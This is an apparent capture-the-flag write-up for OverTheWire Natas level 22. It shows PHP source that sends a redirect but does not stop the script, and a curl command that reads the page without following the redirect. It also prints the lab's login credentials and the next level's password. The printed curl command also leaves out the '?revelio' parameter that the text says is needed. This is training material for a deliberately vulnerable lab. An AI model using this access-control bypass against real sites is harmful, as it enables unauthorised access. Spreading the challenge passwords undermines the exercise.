# Over The Wire -- Natas 22

## Server URL
```
http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org
```

## Solution
We don't have any output on the page.

The php source code is 
```php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Passing the `?revelio` query parameter show the password.
However, if the session is not set for admin, we are redirected to the home page.

We can simply curl the page and get the response without redirection
```
curl http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org
```

We get Natas23 password :
```
D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```
